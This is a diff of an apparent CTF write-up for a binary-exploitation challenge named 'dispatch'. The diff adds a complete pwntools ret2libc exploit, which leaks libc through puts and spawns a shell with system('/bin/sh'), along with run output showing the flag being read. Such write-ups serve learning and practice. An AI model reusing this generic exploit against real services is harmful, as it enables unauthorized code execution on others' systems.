@@ -832,7 +832,7 @@ skid@TheGreen:~/ctfs/new/pwn$
 
 **first look**
 
-```
+```bash
 skid@TheGreen:~/ctfs/new/pwn$ ./dispatch
 === Sparrow Freight dispatch terminal ===
 dispatch> enter waybill number:
@@ -843,7 +843,7 @@ skid@TheGreen:~/ctfs/new/pwn$
 
 **Ghidra decompiled**
 
-```
+```c
 ====================================================================================================
 FUNCTION: pop_rdi_ret
 ADDRESS : 00401176
@@ -877,4 +877,72 @@ undefined8 main(void)
 }
 ```
 
-****
+**buffer overflow so gotta do ret2libc.. crafting payload..**
+
+```py
+#!/usr/bin/env python3
+import sys
+import struct
+from pwn import *
+
+context.binary = elf = ELF('./dispatch', checksec=False)
+libc = ELF('./libc.so.6', checksec=False)
+
+POP_RDI  = 0x401176
+RET      = 0x40101A
+PUTS_PLT = elf.plt['puts']
+PUTS_GOT = elf.got['puts']
+MAIN     = elf.symbols['main']
+OFFSET   = 72
+
+if len(sys.argv) == 3:
+    ip, port = sys.argv[1], int(sys.argv[2])
+    p = remote(ip, port)
+else:
+    p = process('./dispatch')
+
+p.recvuntil(b'waybill number:')
+
+payload = b'A' * OFFSET
+payload += p64(RET)
+payload += p64(POP_RDI) + p64(PUTS_GOT)
+payload += p64(PUTS_PLT)
+payload += p64(RET) + p64(MAIN)
+p.send(payload)
+
+p.recvuntil(b'waybill logged.\n')
+leak = u64(p.recvline().strip().ljust(8, b'\x00'))
+libc.address = leak - libc.symbols['puts']
+log.info(f"libc base = {hex(libc.address)}")
+
+p.recvuntil(b'waybill number:')
+payload = b'A' * OFFSET
+payload += p64(RET)
+payload += p64(POP_RDI) + p64(next(libc.search(b'/bin/sh\x00')))
+payload += p64(libc.symbols['system'])
+p.send(payload)
+
+p.interactive()
+```
+
+**running payload**
+
+```
+skid@TheGreen:~/ctfs/new/pwn$ python3 e.py
+[+] Starting local process './dispatch': pid 5345
+[*] libc base = 0x7c16de800000
+[*] Switching to interactive mode
+
+waybill logged.
+$ ls
+dispatch             e.py  ld-linux-x86-64.so.2  README.txt
+dispatch.ghidra-out  l1    libc.so.6
+$ cat /flag
+flag{congruletion}
+$
+```
+
+---
+
+*Not much explaned in detail but soln here.. ai there.. ask it my dear* <br>
+-TheGreen
